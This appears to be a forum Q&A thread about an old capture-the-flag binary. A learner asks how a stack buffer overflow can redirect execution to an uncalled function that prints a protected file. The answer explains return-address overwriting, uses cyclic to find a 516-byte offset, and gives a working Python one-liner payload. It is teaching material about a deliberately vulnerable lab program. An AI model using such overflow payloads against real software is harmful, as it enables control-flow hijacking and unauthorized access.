    "content": "I'm new to reverse engineering C binaries but have been working on an old ctf and thought to ask for explanation of specific assembly commands and how a buffer overflow might force a function to be called.\nI have taken apart a binary using ghidra and IDA. Its a pretty standard C program with a main() function and methods:\n<pre><code>int main(void)\n\n{\n  body();\n  return 0;\n}\n\nvoid body(void)\n\n{\n  char buffer [500];\n  int size;\n  \n  /* gather input and print to the console */\n  size = read(0,buffer,700);\n  printf(\"\nUser provided %d bytes. Buffer content is: %s\n\",size,buffer);\n  return;\n}\n</code></pre>\n(Note functions listed are reconstructed from assembly code and therefore may not be exactly correct.) It was at this point that I considered a buffer overflow must be the target of the attack.\nFurther searching the program found this function, which I concluded I wanted to call:\n<pre><code>void success(void)\n\n{\n  system(\"cat file_you_cant_access.txt\");\n  return;\n}\n</code></pre>\nThis function is never called but it clearly is the answer to the challenge. So my question is how I can modify the main/body to call this side function.\nUnfortunately I don't really understand assembly code so haven't been able to make sense of where addresses are stored and functions are called. Potentially here are some lines that could be significant (they are the lines in the helper method):\n<pre><code>/* gather input and print to the console */                     \n08048491 55              PUSH       EBP\n08048492 89 e5           MOV        EBP,ESP\n08048494 81 ec 18        SUB        ESP,0x218\n         02 00 00\n0804849a c7 44 24        MOV        dword ptr [ESP + local_214],0x2bc\n         08 bc 02 \n         00 00\n080484a2 8d 85 00        LEA        EAX=>local_204,[EBP + 0xfffffe00]\n         fe ff ff\n080484a8 89 44 24 04     MOV        dword ptr [ESP + local_218],EAX\n080484ac c7 04 24        MOV        dword ptr [ESP]=>local_21c,0x0\n         00 00 00 00\n080484b3 e8 78 fe        CALL       read                                             ssize_t read(int __fd, void * __\n         ff ff\n080484b8 89 45 f4        MOV        dword ptr [EBP + local_10],EAX\n080484bb 8d 85 00        LEA        EAX=>local_204,[EBP + 0xfffffe00]\n         fe ff ff\n080484c1 89 44 24 08     MOV        dword ptr [ESP + local_214],EAX\n080484c5 8b 45 f4        MOV        EAX,dword ptr [EBP + local_10]\n080484c8 89 44 24 04     MOV        dword ptr [ESP + local_218],EAX\n080484cc c7 04 24        MOV        dword ptr [ESP]=>local_21c,s__User_provided_%d   = \"\nUser provided %d bytes. Buf\n         a0 85 04 08\n</code></pre>\nThe issue is that it appears to not be possible to overflow the buffer into anything meaningful. If the answer isn't obvious, perhaps you can walk me through what approach you would take?\n",

            "content": "Basically, when <pre><code>main</code></pre> calls <pre><code>body</code></pre>, it essentially pushes the return address (which is the value of the <pre><code>EIP</code></pre> register, containing the offset of the instruction following the <pre><code>CALL</code></pre> instruction) to the stack, and then jumps to the address of <pre><code>body</code></pre>.\nWhen <pre><code>body</code></pre> will finish running (by executing the <pre><code>RET</code></pre> instruction), it will essentially pop the return address from the stack and jump to wherever it points to. In order to hijack the flow, the attacker must somehow override the stack and place a different address instead of the original return address.\nIn the code you've attached, <pre><code>buffer</code></pre> is placed on the stack. Based on how program stacks behave, somewhere below it is the return address:\n<pre><code>+---------+\n| buffer  | \n|         |\n|         |\n+---------+\n| ...     |\n+---------+\n| ret     | \n+---------+\n</code></pre>\nThere might be a few other things between <pre><code>buffer</code></pre> and <pre><code>ret</code></pre> (such as <pre><code>size</code></pre>, or the old frame pointer), but we can ignore them for the sake of simplicity. The important point is that whatever is in between doesn't push <pre><code>ret</code></pre> \"out of reach\". Since <pre><code>buffer</code></pre> is 500 bytes long, and you are allowed to provide 700 bytes of user input, that's more than enough in order to reach <pre><code>ret</code></pre> and override it.\nSo, the plan is to provide a specially-crafted input so that <pre><code>buffer</code></pre> and <pre><code>...</code></pre> contain any random filler, but <pre><code>ret</code></pre> gets overridden with the address of <pre><code>success</code></pre>. The question now is how long that filler should be.\nIt's possible to calculate the exact length by analyzing the disassembly but there are tools that make it easier, such as cyclic. This tools generates a De-Bruijn sequence which is entered as input to the program. Assuming the input will override <pre><code>ret</code></pre>, we can take the address to which it attempted to jump to and check how far it is from the start of the input. That's the size of the filler.\nTo see this in action, we'll assume that the binary is compiled without protections (<pre><code>gcc vuln.c -o vuln -no-pie -m32 -fno-stack-protector</code></pre>) and that as pointed out by blabb, the input is received by <pre><code>read</code></pre> and not <pre><code>scanf</code></pre>.\nWe provide an input to the program using <pre><code>cyclic</code></pre>:\n<pre><code>$ cyclic -n 4 550 | ./vuln\n\nUser provided 550 bytes.

Now we go back to <pre><code>cyclic</code></pre> to check the offset:\n<pre><code>$ cyclic -n 4 -l 0x66616165\n516\n</code></pre>\nThis means that our filler needs to be <pre><code>516</code></pre> bytes long.\nWe also need the address of <pre><code>success</code></pre> (might be different for you):\n<pre><code>$ objdump -D ./vuln | grep success\n08049182 <success>:\n</code></pre>\nWe'll create the secret file:\n<pre><code>$ echo Secret String > file_you_cant_access.txt\n</code></pre>\nAnd putting it all together, we craft the input (first the filler, then the address of <pre><code>success</code></pre>):\n<pre><code>$ python3 -c 'import sys; sys.stdout.buffer.write(b\"A\"*516 + b\"\\x82\\x91\\x04\\x08\")' | ./vuln\n\nUser provided 520 bytes.
